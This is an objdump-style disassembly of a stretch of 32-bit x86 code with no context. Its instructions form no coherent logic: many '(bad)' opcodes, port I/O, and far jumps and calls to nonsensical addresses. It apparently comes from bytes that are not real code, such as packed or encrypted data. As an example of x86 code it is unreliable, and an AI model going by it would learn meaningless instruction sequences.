  404773:	xchg   ecx,eax
  404774:	rcl    dl,1
  404776:	stc    
  404777:	jmp    0xa309:0x35459e3e
  40477e:	cdq    
  40477f:	aas    
  404780:	add    DWORD PTR [edi-0xd],0x57
  404784:	dec    ecx
  404785:	inc    ebx
  404786:	xor    DWORD PTR [ebx],esi
  404788:	mov    ds:0x9761f7c0,eax
  40478d:	mov    esi,0xeed68a6c
  404792:	jo     0x4047c9
  404794:	or     eax,0xf65429bf
  404799:	add    ebx,DWORD PTR [esi-0x3c]
  40479c:	popa   
  40479d:	sar    BYTE PTR [esi+0x407696ba],0xa8
  4047a4:	aad    0x62
  4047a6:	fmul   DWORD PTR [eax-0x64]
  4047a9:	or     esp,DWORD PTR [ecx+0x4e046d71]
  4047af:	in     al,dx
  4047b0:	icebp  
  4047b1:	ret    
  4047b2:	pop    edx
  4047b3:	add    eax,0x837b746c
  4047b8:	aaa    
  4047b9:	mov    esp,0xea44e23a
  4047be:	hlt    
  4047bf:	adc    ecx,edx
  4047c1:	mov    ch,0x79
  4047c3:	dec    BYTE PTR [eax-0x6a471731]
  4047c9:	mov    ds:0x3e590d9,al
  4047ce:	push   0xffffffd4
  4047d0:	pop    edi
  4047d1:	outs   dx,BYTE PTR ds:[esi]
  4047d2:	fistp  QWORD PTR [edx-0x59]
  4047d5:	sbb    bl,ah
  4047d7:	int3   
  4047d8:	adc    eax,0x81d96df0
  4047dd:	(bad)  
  4047de:	lds    edx,FWORD PTR [ecx+0xb80f1b5]
  4047e4:	out    dx,al
  4047e5:	adc    eax,0x1cbec2a
  4047ea:	dec    ebp
  4047eb:	lock ja 0x4047a7
  4047ee:	stc    
  4047ef:	stos   BYTE PTR es:[edi],al
  4047f0:	(bad)  
  4047f1:	out    dx,al
  4047f2:	sbb    al,0xa0
  4047f4:	dec    edx
  4047f5:	and    esi,DWORD PTR [esi]
  4047f7:	xor    bl,BYTE PTR [ecx-0x61]
  4047fa:	mov    ch,al
  4047fc:	pop    esi
  4047fd:	ds jnp 0x404875
  404800:	sti    
  404801:	xchg   edx,eax
  404802:	sbb    cl,0x61
  404805:	(bad)  
  404806:	pop    edi
  404807:	jp     0x404854
  404809:	and    BYTE PTR [edi],ah
  40480b:	xchg   esi,eax
  40480c:	jnp    0x4047bf
  40480e:	stos   BYTE PTR es:[edi],al
  40480f:	inc    edx
  404810:	aam    0xd5
  404812:	fwait
  404813:	aaa    
  404814:	push   ebp
  404815:	imul   DWORD PTR [edx-0x24c8c545]
  40481b:	and    esp,edi
  40481d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40481e:	cld    
  40481f:	or     al,0xaf
  404821:	ret    0x6363
  404824:	(bad)  
  404826:	fldcw  WORD PTR [edi-0x7e]
  404829:	cld    
  40482a:	or     al,0xeb
  40482c:	sbb    ebp,DWORD PTR [esi-0x184b5ed1]
  404832:	iret   
  404833:	or     eax,0x7f6bd0c2
  404838:	cld    
  404839:	scas   eax,DWORD PTR es:[edi]
  40483a:	add    al,0x2
  40483c:	dec    edi
  40483d:	test   al,0x5a
  40483f:	sub    ecx,DWORD PTR [esi+ecx*2+0x7d]
  404843:	lods   al,BYTE PTR ds:[esi]
  404844:	test   BYTE PTR [edx],al
  404846:	mov    edx,0x22609544
  40484b:	mov    esi,0xa3632ae7
  404850:	add    al,0xe3
  404852:	mov    eax,DWORD PTR [ebp-0x48]
  404855:	pop    ecx
  404856:	push   edi
  404857:	adc    bl,BYTE PTR [ebx+esi*8-0x17]
  40485b:	call   0xb5d8ec01
  404860:	add    al,0x19
  404862:	mov    esi,0xddfc169a
  404867:	adc    eax,0xc9fa26af
  40486c:	dec    esp
  40486d:	cli    
  40486e:	fisubr WORD PTR [edi+0xf1b97e6]
  404874:	out    dx,al
  404875:	xchg   bl,dh
  404877:	dec    edx
  404878:	inc    esi
  404879:	and    al,0x54
  40487b:	sbb    al,0x1b
  40487d:	test   DWORD PTR [eax-0x4da25b05],ebx
  404883:	inc    edi
  404884:	pop    edx
  404885:	hlt    
  404886:	adc    al,0x6c
  404888:	out    dx,eax
  404889:	in     al,0x1
  40488b:	sbb    eax,0xd64293e9
  404890:	sar    ch,0xd2
  404893:	sub    DWORD PTR [ebx-0x534e8818],esp
  404899:	test   al,0xaf
  40489b:	aad    0x95
  40489d:	lahf   
  40489e:	mov    dl,0x7f
  4048a0:	popa   
  4048a1:	cs sbb al,0xe2
  4048a4:	inc    esi
  4048a5:	sbb    eax,0xecea992c
  4048aa:	pop    ds
  4048ab:	ret    0x9b7
  4048ae:	push   ebx
  4048af:	inc    esp
  4048b0:	fnsave [edx-0x48]
  4048b3:	and    dl,0xa1
  4048b6:	jge    0x404844
  4048b8:	inc    DWORD PTR [edx]
  4048ba:	or     bh,dh
  4048bc:	or     al,0x6
  4048be:	jbe    0x404898
  4048c0:	retw   0xc0a5
  4048c4:	aam    0x4a
  4048c6:	ror    BYTE PTR [eax-0x5d],0xc6
  4048ca:	mov    ebx,0x4ec00a0a
  4048cf:	xchg   esp,eax
  4048d0:	mov    es,ebx
  4048d2:	dec    edx
  4048d3:	dec    edx
  4048d4:	xchg   DWORD PTR [ebx],edx
  4048d6:	jmp    0xe1104534
  4048db:	sbb    BYTE PTR [esi-0x28],0x1
  4048df:	xchg   esi,eax
  4048e0:	dec    ecx
  4048e1:	push   0xffffffdb
  4048e3:	jbe    0x40486e
  4048e5:	out    0xf0,eax
  4048e7:	std    
  4048e8:	sbb    BYTE PTR [ebp+0x5b],0x2d
  4048ec:	in     eax,dx
  4048ed:	popf   
  4048ee:	or     eax,0x54b81739
  4048f3:	lds    ecx,FWORD PTR ds:0x5123a5d6
  4048f9:	(bad)  
  4048fa:	dec    ecx
  4048fb:	adc    BYTE PTR [edi+0x695297d1],bh
  404901:	cs pop ebx
  404903:	(bad)  
  404904:	test   al,0x9e
  404906:	js     0x404914
  404908:	test   BYTE PTR [edi],ah
  40490a:	mov    BYTE PTR [ebp+0x3c],al
  40490d:	pop    edx
  40490e:	out    0x6e,al
  404910:	in     eax,dx
  404911:	mov    bh,0xca
  404913:	pop    ebp
  404914:	pop    ebp
  404915:	or     DWORD PTR [edx+0x3e9f0a31],ebx
  40491b:	stos   BYTE PTR es:[edi],al
  40491c:	int3   
  40491d:	or     DWORD PTR ds:0x782825f6,ebx
  404923:	out    dx,eax
  404924:	fmul   QWORD PTR [edx+esi*4+0x8]
  404928:	data16 outs dx,BYTE PTR ds:[esi]
  40492a:	mov    DWORD PTR [ebp+0x6fb9d6bd],esi
  404930:	into   
  404931:	lods   eax,DWORD PTR ds:[esi]
  404932:	push   0x71430b93
  404937:	sub    eax,0x5b63b1d
  40493c:	or     edi,edx
  40493e:	in     eax,0x35
  404940:	xor    eax,0x915474
  404945:	push   ebx
  404946:	out    dx,al
  404947:	adc    ebp,DWORD PTR [ecx]
  404949:	clc    
  40494a:	mov    bh,0x9c
  40494c:	fnstcw WORD PTR [ecx+0x1281d1a5]
  404952:	aam    0xa3
  404954:	cmp    ch,0x95
  404957:	dec    ecx
  404958:	loopne 0x404993
  40495a:	xchg   BYTE PTR [eax+0x44],cl
  40495d:	ret    0xe266
  404960:	inc    DWORD PTR [eax+0x747d902e]
  404966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404967:	and    bh,dh
  404969:	push   ebp
  40496a:	push   edx
  40496b:	fdiv   st(6),st
  40496d:	loope  0x4048fe
  40496f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404970:	dec    ebp
  404971:	mov    eax,ds:0xbf36f72c
  404976:	addr16 shl ecx,cl
  404979:	mov    al,ds:0x69f5842b
  40497e:	adc    bl,BYTE PTR ds:0x779c8d40
  404984:	dec    esi
  404985:	ret    0xb0f0
  404988:	and    al,0xd3
  40498a:	idiv   DWORD PTR [ebp+0x74]
  40498d:	xchg   ebx,eax
  40498e:	out    0x95,eax
  404990:	jb     0x404971
  404992:	popa   
  404993:	sti    
  404994:	push   ds
  404995:	cmp    BYTE PTR [edi],ch
  404997:	mov    ah,dh
  404999:	or     al,0x11
  40499b:	int    0xbe
  40499d:	or     al,bl
  40499f:	sbb    eax,0x3ca4be7f
  4049a4:	jb     0x40498e
  4049a6:	adc    DWORD PTR [ebp+0x7a67b937],esp
  4049ac:	mov    ?,WORD PTR [ecx-0x7dd67b64]
  4049b2:	jmp    0xf9e4:0x98a7e596
  4049b9:	aam    0x34
  4049bb:	jge    0x404998
  4049bd:	add    ebp,DWORD PTR [eax+0x36]
  4049c0:	cmp    eax,0x4196fcfe
  4049c5:	push   ebx
  4049c6:	or     eax,0xaa5a603d
  4049cb:	nop
  4049cc:	sti    
  4049cd:	jmp    0x404a33
  4049cf:	add    al,0x6d
  4049d1:	jmp    0xb038e1a6
  4049d6:	or     ebx,esp
  4049d8:	scas   eax,DWORD PTR es:[edi]
  4049d9:	xchg   ebx,eax
  4049da:	das    
  4049db:	out    0xf8,eax
  4049dd:	fcmove st,st(4)
  4049df:	and    eax,0xfb66f9f6
  4049e4:	dec    esi
  4049e5:	mov    ch,0x76
  4049e7:	sbb    ecx,DWORD PTR ds:0xcf07b0dd
  4049ed:	adc    al,0x2b
  4049ef:	out    0x91,eax
  4049f1:	ja     0x4049c5
  4049f3:	imul   ebp,DWORD PTR [ebx+eax*2-0x2e],0xfffffff2
  4049f8:	fst    DWORD PTR [ecx-0x7a]
  4049fb:	xlat   BYTE PTR ds:[ebx]
  4049fc:	jmp    0x404a7a
  4049fe:	repz xchg esp,eax
  404a00:	dec    edx
  404a01:	loopne 0x404a66
  404a03:	xor    bh,BYTE PTR [eax-0x6e26d3ae]
  404a09:	stos   BYTE PTR es:[edi],al
  404a0a:	cmp    ebx,edi
  404a0c:	mov    ebp,0xa557117c
  404a11:	pusha  
  404a12:	adc    eax,0x6a1a6051
  404a17:	jae    0x404a8f
  404a19:	and    edi,DWORD PTR [edi-0x12]
  404a1c:	loopne 0x404a1f
  404a1e:	fcomp  QWORD PTR [ecx-0x75]
  404a22:	jns    0x404a0e
  404a24:	jo     0x404a64
  404a26:	in     al,0xe1
  404a28:	stc    
  404a29:	mov    al,ds:0x85d1bbc9
  404a2e:	fcmovb st,st(7)
  404a30:	pop    edi
  404a31:	pop    es
  404a32:	lods   eax,DWORD PTR ss:[esi]
  404a34:	cwde   
  404a35:	jge    0x4049b7
  404a37:	inc    edi
  404a38:	xor    eax,0xaea2762b
  404a3d:	(bad)  [ebp+0x22]
  404a40:	in     al,0x4f
  404a42:	cmc    
  404a43:	push   ss
  404a44:	aaa    
  404a45:	loope  0x404ab3
  404a47:	sti    
  404a48:	imul   esp,DWORD PTR [eax],0xffffffe7
  404a4b:	arpl   WORD PTR [ebx],cx
  404a4d:	dec    edi
  404a4e:	push   edi
  404a4f:	inc    ebx
  404a50:	cdq    
  404a51:	mov    ah,0xa7
  404a53:	ins    BYTE PTR es:[edi],dx
  404a54:	push   0xb74e25de
  404a59:	ret    0x83ec
  404a5c:	pop    ecx
  404a5d:	clc    
  404a5e:	adc    BYTE PTR [ebp+0x2039e377],dl
  404a64:	add    eax,0x5336402a
  404a69:	sbb    ch,BYTE PTR [esi+0x566a2076]
  404a6f:	mov    bl,al
  404a71:	push   ebx
  404a72:	adc    edx,ebx
  404a74:	push   0x1c
  404a76:	(bad)  
  404a77:	adc    bh,BYTE PTR [ecx-0x7a5eaab6]
  404a7d:	xchg   ebp,eax
  404a7e:	adc    DWORD PTR [esi+0x28],esi
  404a81:	adc    bh,BYTE PTR [eax+esi*8]
  404a84:	out    dx,eax
  404a85:	mov    al,BYTE PTR ds:0xcf7662bb
  404a8b:	in     al,dx
  404a8c:	ret    0xd25f
  404a8f:	jmp    0xe0f4:0x7cf0fc55
  404a96:	add    eax,0x69f459ab
  404a9b:	push   edx
  404a9c:	in     eax,0x7c
  404a9e:	gs jae 0x404a9b
  404aa1:	mov    ecx,edx
  404aa3:	fistp  QWORD PTR [ecx+0x68488738]
  404aa9:	adc    ebp,ecx
  404aab:	stc    
  404aac:	push   ebx
  404aad:	xor    ebp,esi
  404aaf:	sbb    BYTE PTR [ebx],bh
  404ab1:	mov    eax,esp
  404ab3:	add    al,0x19
  404ab5:	data16 sub al,0x54
  404ab8:	xchg   edx,eax
  404ab9:	retf   0xc239
  404abc:	je     0x404a86
  404abe:	pop    esp
  404abf:	pop    esi
  404ac0:	das    
  404ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ac2:	or     eax,0x5419fd45
  404ac7:	or     DWORD PTR [ebx],ebx
  404ac9:	fsub   QWORD PTR [ebx+0x513269e]
  404acf:	fnstsw WORD PTR [edi-0x4a]
  404ad2:	adc    BYTE PTR [edx+0x165f8b90],bl
  404ad8:	mov    dl,0x8b
  404ada:	cmp    al,0xaa
  404adc:	mov    edx,ds
  404ade:	ins    BYTE PTR es:[edi],dx
  404adf:	sbb    esi,eax
  404ae1:	mov    ebx,0x3e3405bc
  404ae6:	mov    bl,0xa6
  404ae8:	(bad)  
  404ae9:	xchg   DWORD PTR [eax+0x6d],ecx
  404aec:	fst    QWORD PTR [edx-0x14a7fdb0]
  404af2:	pushf  
  404af3:	dec    ecx
  404af4:	int3   
  404af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404af6:	mov    ebx,0x7663f065
  404afb:	xchg   esi,eax
  404afc:	xor    bh,BYTE PTR [esi]
  404afe:	fcom   DWORD PTR fs:[edx-0x6276bcaf]
  404b05:	jp     0x404b0c
  404b07:	cmp    DWORD PTR [edx-0x6d],ebx
  404b0a:	in     eax,0xc0
  404b0c:	(bad)  
  404b0d:	xchg   esp,eax
  404b0e:	add    eax,edx
  404b10:	pop    ebp
  404b11:	push   ds
  404b12:	mov    eax,ds:0xc2a239af
  404b17:	sub    bh,ah
  404b19:	(bad)  
  404b1a:	lock xor eax,0x5cd66cbf
  404b20:	push   edx
  404b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b22:	(bad)
  404b25:	push   ebx
  404b26:	outs   dx,BYTE PTR ds:[esi]
  404b27:	add    ch,BYTE PTR [eax+0x2]
  404b2a:	(bad)  [esi+0xb977fb8]
  404b30:	or     edi,0x79b87114
  404b36:	lds    edx,FWORD PTR [ebx+edx*1]
  404b39:	dec    edx
  404b3a:	call   0x558cb22d
  404b3f:	shr    DWORD PTR [edi+0x371aaf50],cl
  404b45:	inc    esi
  404b46:	jae    0x404bba
  404b48:	inc    edx
  404b49:	pop    esp
  404b4a:	ins    BYTE PTR es:[edi],dx
  404b4b:	sub    al,0xad
  404b4d:	xchg   esp,eax
  404b4e:	lock and al,0xef
  404b51:	xchg   ebx,eax
  404b52:	imul   esi,DWORD PTR [ecx],0x30fb524e
  404b58:	les    ecx,FWORD PTR [ebx-0x753bce67]
  404b5e:	jmp    0xb4e9d959
  404b63:	jb     0x404b50
  404b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b66:	inc    ecx
  404b67:	out    dx,eax
  404b68:	or     edx,edi
  404b6a:	int    0xcc
  404b6c:	or     eax,0x2616668a
  404b71:	mov    dl,0x18
  404b73:	sbb    BYTE PTR ds:0x487edb04,dl
  404b79:	jmp    0x404b22
  404b7b:	icebp  
  404b7c:	inc    ecx
  404b7d:	sti    
  404b7e:	inc    edx
  404b7f:	or     BYTE PTR [ebp+0x51cda18c],ah
  404b85:	inc    eax
  404b86:	jecxz  0x404bfe
  404b88:	leave  
  404b89:	push   esp
  404b8a:	mov    al,0x7
  404b8c:	mov    ch,0x93
  404b8e:	mov    ?,ebx
  404b90:	lea    edi,[edx+edx*1]
  404b93:	fst    DWORD PTR [esi]
  404b95:	add    DWORD PTR [esi-0x33c09bf7],ecx
  404b9b:	push   0xde38cd0c
  404ba0:	loopne 0x404b84
  404ba2:	sbb    ch,BYTE PTR [edi+0x70]
  404ba5:	fdiv   QWORD PTR [edx]
  404ba7:	loopne 0x404bd3
  404ba9:	scas   al,BYTE PTR es:[edi]
  404baa:	pop    ss
  404bab:	les    esi,FWORD PTR [ecx]
  404bad:	shl    eax,1
  404baf:	imul   ebx,DWORD PTR [esi-0x572a89b3],0x682ba925
  404bb9:	pusha  
  404bba:	pop    ebx
  404bbb:	and    esp,edi
  404bbd:	push   eax
  404bbe:	packssdw mm3,QWORD PTR [edi-0x2f8deca1]
  404bc5:	retf   
  404bc6:	jne    0x404b50
  404bc8:	mov    ecx,0x73c8c9d
  404bcd:	inc    ebp
  404bce:	pop    esi
  404bcf:	test   BYTE PTR [edx+0x35],0x9b
  404bd3:	mul    DWORD PTR [ebp+ecx*1+0x6c34699f]
  404bda:	rcl    bh,1
  404bdc:	enter  0x51d6,0xe8
  404be0:	xchg   esp,eax
  404be1:	inc    ebp
  404be2:	or     ecx,DWORD PTR [edx-0x6e169635]
  404be8:	jne    0x404bab
  404bea:	inc    edi
  404beb:	mov    WORD PTR [edx],gs
  404bed:	or     eax,0x928bf399
  404bf2:	test   eax,0x1bcbc2f6
  404bf7:	inc    ebx
  404bf8:	ror    BYTE PTR [ebx+0x6252cb61],0xb7
  404bff:	adc    DWORD PTR [esi+0x3b89764e],ecx
  404c05:	sahf   
  404c06:	mov    ebp,0x99afdd16
  404c0b:	stc    
  404c0c:	and    ecx,DWORD PTR es:[esi+0x62]
  404c10:	outs   dx,BYTE PTR ds:[esi]
  404c11:	js     0x404bcf
  404c13:	rcr    DWORD PTR [esp+edi*4],0x70
  404c17:	push   esi
  404c18:	scas   eax,DWORD PTR es:[edi]
  404c19:	shr    BYTE PTR [edx],cl
  404c1b:	jae    0x404bde
  404c1d:	clc    
  404c1e:	jp     0x404bc5
  404c20:	mov    ebx,0x377a4284
  404c25:	jle    0x404be5
  404c27:	dec    DWORD PTR [ecx+0x31]
  404c2a:	push   ebx
  404c2b:	fimul  WORD PTR [edx+edi*4-0x6dd5554e]
  404c32:	lds    esi,FWORD PTR es:[eax-0x13445a48]
  404c39:	(bad)  
  404c3b:	jg     0x404c47
  404c3d:	and    DWORD PTR [eax],edi
  404c3f:	dec    ebx
  404c40:	loopne 0x404cbb
  404c42:	push   ss
  404c43:	shl    BYTE PTR ds:0xf0cebd93,1
  404c49:	cld    
  404c4a:	mov    WORD PTR [ebx+eax*1+0x51e1c3ae],fs
  404c51:	fimul  DWORD PTR [eax+0x7e6e7a2c]
  404c57:	add    BYTE PTR [edi-0x47cef12b],bl
  404c5d:	jle    0x404cdc
  404c5f:	stc    
  404c60:	cmp    BYTE PTR [edi],dh
  404c62:	push   esp
  404c63:	dec    ebp
  404c64:	add    dl,bl
  404c66:	mov    edi,0x4de2d49c
  404c6b:	sbb    al,0xf1
  404c6d:	xor    DWORD PTR [edx+0x2b],esi
  404c70:	ret    
  404c71:	xor    DWORD PTR [edi+0x3909cf33],ebx
  404c77:	(bad)  
  404c78:	out    dx,al
  404c79:	pusha  
  404c7a:	sbb    bh,0xe5
  404c7d:	test   eax,0x77234145
  404c82:	enter  0x4823,0xaf
  404c86:	das    
  404c87:	dec    esp
  404c88:	sbb    eax,0xf5023867
  404c8d:	inc    esp
  404c8e:	bound  edi,QWORD PTR [ebp+0x5b]
  404c91:	dec    ebp
  404c92:	cwde   
  404c93:	xchg   ebx,eax
  404c94:	jle    0x404c55
  404c96:	or     al,0xe5
  404c98:	xor    esp,DWORD PTR [esi-0x32379db7]
  404c9e:	xor    DWORD PTR [ebx+0x39],ecx
  404ca1:	mov    ebp,0x3e9bff96
  404ca6:	test   BYTE PTR [esi-0x43],ah
  404ca9:	sub    al,0x41
  404cab:	inc    esp
  404cac:	out    0xa3,al
  404cae:	rcr    BYTE PTR [ebx],0xbd
  404cb1:	ret    
  404cb2:	ss push ebp
  404cb4:	mov    ds:0x9229164d,al
  404cb9:	or     esi,DWORD PTR [ebx+0x25f2415a]
  404cbf:	cmp    DWORD PTR [eax+ebx*4],ecx
  404cc2:	test   DWORD PTR [esi],edx
  404cc4:	inc    ebp
  404cc5:	sub    dl,BYTE PTR [edi]
  404cc7:	sbb    eax,0xcad20b6f
  404ccc:	loopne 0x404c73
  404cce:	pop    ecx
  404ccf:	js     0x404d4b
  404cd1:	fimul  DWORD PTR [ecx]
  404cd3:	inc    edx
  404cd4:	mov    WORD PTR [ebp-0x3c],fs
  404cd7:	adc    eax,0x7ea470a8
  404cdc:	mov    ebx,0x76a934a3
  404ce1:	stos   DWORD PTR es:[edi],eax
  404ce2:	xchg   ebp,eax
  404ce3:	or     ah,BYTE PTR [edx-0x420b9a6b]
  404ce9:	xchg   BYTE PTR [ebx],bl
  404ceb:	inc    ebp
  404cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ced:	mov    ebp,0x8459c94a
  404cf2:	(bad)  
  404cf3:	fcmovb st,st(4)
  404cf5:	push   esp
  404cf6:	pop    edi
  404cf7:	push   edx
  404cf8:	out    dx,eax
  404cf9:	mov    ebx,0xd88761db
  404cfe:	and    eax,0xf91925f9
  404d03:	dec    ebp
  404d04:	std    
  404d05:	imul   edx,DWORD PTR [eax+0x707d27ef],0xffffffd1
  404d0c:	mov    edx,0x10aa0701
  404d11:	gs sbb eax,0x45fa2ed1
  404d17:	mov    DWORD PTR [esi],esi
  404d19:	(bad)  [ebp+0x77]
  404d1c:	pop    ds
  404d1d:	data16 sti 
  404d1f:	add    cl,BYTE PTR [ecx]
  404d21:	mov    BYTE PTR [ebx-0x1e],bh
  404d24:	inc    edi
  404d25:	repnz outs dx,DWORD PTR ds:[esi]
  404d27:	(bad)  
  404d28:	and    DWORD PTR [ebx-0x63],eax
  404d2b:	xchg   DWORD PTR [edx-0x7ee1a63f],edx
  404d31:	jmp    0x78dcab53
  404d36:	jne    0x404d8f
  404d38:	outs   dx,DWORD PTR ds:[esi]
  404d39:	ss iret 
  404d3b:	cmp    DWORD PTR ds:0x8059c5ed,ebx
  404d41:	mov    ebx,0x26fc91b
  404d46:	or     DWORD PTR [esi+0x5b],ebp
  404d49:	fucomip st,st(1)
  404d4b:	(bad)  
  404d4c:	ja     0x404d9b
  404d4e:	(bad)  
  404d4f:	jne    0x404d17
  404d51:	mov    cl,0x1b
  404d53:	cmp    bl,BYTE PTR [esi-0x4c]
  404d56:	mov    fs,WORD PTR [edi+eax*4+0x61]
  404d5a:	bound  edx,QWORD PTR [esi+0x4a4348bc]
  404d60:	data16 jle 0x404d57
  404d63:	rcl    DWORD PTR [eax+0x176fe485],0xd0
  404d6a:	inc    edx
  404d6b:	adc    bp,ax
  404d6e:	sub    edx,edx
  404d70:	or     ch,bh
  404d72:	inc    ebx
  404d73:	add    dl,BYTE PTR [esi+0x7d]
  404d76:	lock stos WORD PTR es:[edi],ax
  404d79:	cmp    esi,DWORD PTR [esi]
  404d7b:	pop    edx
  404d7c:	mov    ah,BYTE PTR [edx]
  404d7e:	mov    ah,0xc6
  404d80:	push   ecx
  404d81:	mov    ds:0x184f7a1a,eax
  404d86:	lock mov fs,esp
  404d89:	aas    
  404d8a:	or     BYTE PTR [esp+ebp*1-0x73],dh
  404d8e:	scas   eax,DWORD PTR es:[edi]
  404d8f:	and    eax,0x7bcb9d02
  404d94:	nop
  404d95:	dec    ebx
  404d96:	aad    0xed
  404d98:	rol    dh,cl
  404d9a:	cmp    esp,ecx
  404d9c:	push   es
  404d9d:	add    al,ah
  404d9f:	cmp    esi,DWORD PTR [ebx]
  404da1:	out    0xac,eax
  404da3:	daa    
  404da4:	dec    ebp
  404da5:	pop    eax
  404da6:	and    DWORD PTR [ebp-0x10],ebx
  404da9:	jns    0x404d46
  404dab:	and    eax,0xce912425
  404db0:	xchg   esi,eax
  404db1:	call   0x9d32:0xae098bf0
  404db8:	cmp    al,0x88
  404dba:	mov    ebp,0x5545bd32
  404dbf:	fwait
  404dc0:	lods   al,BYTE PTR ds:[esi]
  404dc1:	loopne 0x404dd0
  404dc3:	mov    ds:0x6ea1f712,al
  404dc8:	dec    eax
  404dc9:	and    ch,0x1e
  404dcc:	fcmovbe st,st(1)
  404dce:	mov    esp,0x1567ae0f
  404dd3:	xchg   esp,eax
  404dd4:	(bad)  
  404dd5:	popa   
  404dd6:	or     bl,ah
  404dd8:	mov    WORD PTR [edx-0x2236b244],ds
  404dde:	xchg   edi,eax
  404ddf:	mov    ch,0x8c
  404de1:	mov    ebp,0x5c47f5de
  404de6:	in     al,0x33
  404de8:	sbb    bl,ch
  404dea:	lods   eax,DWORD PTR ds:[esi]
  404deb:	jle    0x404e21
  404ded:	fs jno 0x404dbd
  404df0:	rcl    DWORD PTR [edx-0x72],0xbe
  404df4:	jo     0x404ddc
  404df6:	test   dh,ah
  404df8:	outs   dx,DWORD PTR ds:[esi]
  404df9:	add    eax,0x784b1a29
  404dfe:	loop   0x404dee
  404e00:	or     DWORD PTR [ecx+0x33805e2c],esp
  404e06:	loopne 0x404e55
  404e08:	push   esp
  404e09:	mov    dl,bh
  404e0b:	scas   eax,DWORD PTR es:[edi]
  404e0c:	call   0xc1e3:0xfb07c367
  404e13:	dec    esp
  404e14:	fs pop edx
  404e16:	ss nop
  404e18:	sti    
  404e19:	mov    eax,0xb42cc7e2
  404e1e:	inc    eax
  404e1f:	fcomp  DWORD PTR [edi]
  404e21:	jbe    0x404e0c
  404e23:	popf   
  404e24:	xchg   edx,eax
  404e25:	lods   eax,DWORD PTR ds:[esi]
  404e26:	adc    edx,DWORD PTR [ebp-0x53e9e73c]
  404e2c:	out    0x8a,al
  404e2e:	pop    ebx
  404e2f:	ss (bad) 
  404e31:	push   0xc7b5fee4
  404e36:	inc    ebx
  404e37:	push   cs
  404e38:	push   esi
  404e39:	scas   al,BYTE PTR es:[edi]
  404e3a:	cmp    edi,DWORD PTR ds:0xce817c15
  404e40:	add    DWORD PTR [ebp+0x55],ebx
  404e43:	add    ecx,DWORD PTR [eax]
  404e45:	mov    bh,0x44
  404e47:	call   0x5f76:0xf5f3e10d
  404e4e:	test   al,0x4d
  404e50:	cmp    BYTE PTR [ebp-0x74],bl
  404e53:	push   eax
  404e54:	cmp    BYTE PTR ss:[ecx+esi*2+0x304193ac],bh
  404e5c:	iret   
  404e5d:	jmp    0x404e3c
  404e5f:	clc    
  404e60:	xchg   BYTE PTR [ebp-0x27c2c3ff],ah
  404e66:	sbb    al,0x9
  404e68:	and    BYTE PTR [edi-0x4310366b],ah
  404e6e:	cmc    
  404e6f:	push   esp
  404e70:	mov    edx,0x3d93ae4c
  404e75:	jne    0x404e06
  404e77:	dec    esp
  404e78:	xor    DWORD PTR [edi+0x55852aa3],ecx
  404e7e:	or     esp,DWORD PTR [esi+0x75]
  404e81:	mov    dh,0xf1
  404e83:	scas   eax,DWORD PTR es:[edi]
  404e84:	test   DWORD PTR [ecx-0x266f2569],ecx
  404e8a:	adc    ecx,DWORD PTR [ebx-0x7f9a6709]
  404e90:	mov    dl,0x27
  404e92:	mov    DWORD PTR [ecx-0x2e],esi
  404e95:	adc    ebp,ebx
  404e97:	call   0xe5b5082f
  404e9c:	sub    edi,DWORD PTR [edx-0x1e4cdc91]
  404ea2:	xchg   edx,eax
  404ea3:	repnz and dh,BYTE PTR [edx+eax*1+0x58cfea69]
  404eab:	cwde   
  404eac:	or     esi,DWORD PTR [edi+0x237ac14d]
  404eb2:	add    al,0x26
  404eb4:	pop    ebp
  404eb5:	sub    al,0x76
  404eb7:	sti    
  404eb8:	int3   
  404eb9:	or     ebx,DWORD PTR [eax+0x3a]
  404ebc:	push   es
  404ebd:	gs cs lock push 0xe
  404ec2:	stc    
  404ec3:	mov    BYTE PTR [ecx],cl
  404ec5:	dec    esp
  404ec6:	inc    BYTE PTR [esi+0x78]
  404ec9:	retf   0x76cb
  404ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ece:	push   ss
  404ecf:	dec    esi
  404ed0:	lea    esi,[edx+0x10e32986]
  404ed6:	and    al,0xe1
  404ed8:	and    dl,BYTE PTR [esi+0x3d]
  404edb:	cwde   
  404edc:	pusha  
  404edd:	dec    edi
  404ede:	repz arpl WORD PTR [edx],ax
  404ee1:	cmp    DWORD PTR [esi],ecx
  404ee3:	jmp    0x404ef9
  404ee5:	dec    ecx
  404ee6:	pop    edx
  404ee7:	ins    BYTE PTR es:[edi],dx
  404ee8:	mov    ch,0xd3
  404eea:	das    
  404eeb:	sub    BYTE PTR [edx+ecx*8],ch
  404eee:	or     ah,cl
  404ef0:	jae    0x404eee
  404ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ef3:	push   ds
  404ef4:	scas   al,BYTE PTR es:[edi]
  404ef5:	lahf   
  404ef6:	jg     0x404ef7
  404ef8:	stos   DWORD PTR es:[edi],eax
  404ef9:	lds    esi,FWORD PTR [ecx]
  404efb:	fild   DWORD PTR [ecx]
  404efd:	cmp    DWORD PTR [edi],ebx
  404eff:	shl    DWORD PTR [edi+0x6e4bf46e],1
  404f05:	pop    ebp
  404f06:	int    0x70
  404f08:	aas    
  404f09:	icebp  
  404f0a:	adc    BYTE PTR [ecx-0x69],bh
  404f0d:	cdq    
  404f0e:	fiadd  DWORD PTR [edi+0x78f74ea6]
  404f14:	ss xchg edi,eax
  404f16:	in     eax,dx
  404f17:	test   DWORD PTR [esi-0x2d3dc2dc],esp
  404f1d:	(bad)  
  404f1e:	mov    DWORD PTR [eax],ecx
  404f20:	adc    ah,dh
  404f22:	imul   DWORD PTR [esi+0x5e44e49]
  404f28:	cmp    eax,DWORD PTR [ebp+0x64f014c8]
  404f2e:	loope  0x404eec
  404f30:	mov    ch,0xc2
  404f32:	in     al,0x4d
  404f34:	jns    0x404f78
  404f36:	jp     0x404f19
  404f38:	out    0x4e,eax
  404f3a:	push   ss
  404f3b:	jo     0x404f33
